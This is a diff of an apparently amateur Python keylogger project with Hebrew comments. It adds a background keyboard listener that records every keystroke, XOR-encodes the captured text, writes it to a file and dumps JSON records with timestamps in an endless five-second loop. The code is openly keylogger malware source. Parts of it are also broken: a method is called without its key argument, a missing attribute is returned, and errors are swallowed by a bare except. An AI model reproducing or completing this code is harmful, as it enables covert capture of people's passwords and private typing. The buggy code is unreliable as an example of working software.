@@ -33,16 +33,22 @@ class IWriter(ABC):
 
 #xor מחלקה שמצפינה מילים באמצעות
 class Encryptor:
-    def encryption_using_xor(self,data: list,key):
+    def encryption_using_xor(self,data,key):
         encrypted_text = ''
-        for i, word in enumerate(data):
-            encrypted_text += chr(ord(word) ^ key * i)
-        print (encrypted_text)    
-        return encrypted_text
+        try:
+            for i, word in enumerate(data):
+                if word == '[' or word == ']':
+                    continue
+                else:    
+                    encrypted_text += chr(ord(word) ^ key * i)
+            print (encrypted_text)    
+            return self.encrypted_text
+        except:
+             return encrypted_text
     #דוגמא לשימוש בהצפנה
-a = Encryptor()
-b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
-a.encryption_using_xor(b,4)
+# a = Encryptor()
+# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
+# a.encryption_using_xor(b,4)
 
 
 
@@ -51,7 +57,8 @@ class KeyLoggerService(IKeyLogger):
     
         self.listener = None
         super().__init__()
-    def start_logging(self):
+    def start_logging(self): 
+        
         def on_press(key):
             global text
             if key == keyboard.Key.enter:
@@ -73,9 +80,11 @@ class KeyLoggerService(IKeyLogger):
             else:
                 self.text.append(key)
                 print(self.text)
-        with keyboard.Listener(
-            on_press=on_press) as self.listener:
-            self.listener.join()       
+        self.listener = keyboard.Listener(on_press=on_press) 
+        self.listener.start()       
+        # with keyboard.Listener(
+        #     on_press=on_press) as self.listener:
+        #     self.listener.start()       
 
     def stop_logging(self):
         if self.start_logging:
@@ -87,16 +96,16 @@ class FileWriter(IWriter):
     def __init__(self):
         super().__init__()
         self.Encryption = Encryptor()
-    def send_data(self, data: str, machine_name: str):
+    def send_data(self, data:str , machine_name: str):
+            text = ''
             for i in data:
                 text += self.Encryption.encryption_using_xor(i)
-    with open('text.txt','a') as file:
-            file.write(text)
+            with open('text.txt','a') as file:
+                        file.write(text)
 
                      
-
 # a = KeyLoggerService()
-
+# a.start_logging()
 # b = FileWriter()
 # b.send_data()
 class KeyLoggerManager(FileWriter,KeyLoggerService):
@@ -106,13 +115,23 @@ class KeyLoggerManager(FileWriter,KeyLoggerService):
     def start(self):
             from datetime import datetime
             import time
-            start_time = datetime.now()
-            a = Encryptor()
+            import json
+            writing_to_a_file = FileWriter()
             self.start_logging()
-            while len(self.text) >= 1000:
-                end_time = datetime.now()
-                a.encryption_using_xor(self.text)
-                jeson = {'start time':start_time,'data':self.text,'end time':end_time}
+            self.Encryption = Encryptor()
+            while True:
+                    writing_to_a_file.send_data(self.text,'l')
+                    start_time = str(datetime.now())
+                    time.sleep(5)
+                    
+                    end_time = str(datetime.now())
+                    jeson = {'start time':start_time,'data':self.Encryption.encryption_using_xor(str(self.text),4),'end time':end_time}
+                    json.dumps(jeson,ensure_ascii=False)
+                    print(jeson)
+                    self.text.clear()
+                    
+                    
+                    
                 
 c = KeyLoggerManager()
 c.start()
